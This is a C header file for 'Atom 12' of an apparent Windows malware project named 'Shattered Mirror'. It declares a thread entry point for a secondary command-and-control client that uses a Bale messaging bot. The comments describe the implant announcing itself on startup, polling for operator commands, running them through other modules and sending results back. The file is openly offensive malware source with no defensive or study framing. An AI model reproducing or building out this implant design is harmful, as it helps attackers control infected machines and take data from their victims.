#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 12: Bale Bot Client (Secondary C2)
 *
 * Connects implant to a Bale bot (Telegram API compatible).
 * - Sends enriched online notification on startup.
 * - Long‑polls for commands from the operator.
 * - Executes commands by spawning other atoms via Orchestrator IPC.
 * - Receives atom output via forwarded reports and replies to Telegram.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_12_BALE_H
#define SMIRROR_ATOM_12_BALE_H

#include <windows.h>

/* Launch the Bale bot client thread */
DWORD WINAPI BaleBotAtomMain(LPVOID lpParam);

#endif /* SMIRROR_ATOM_12_BALE_H */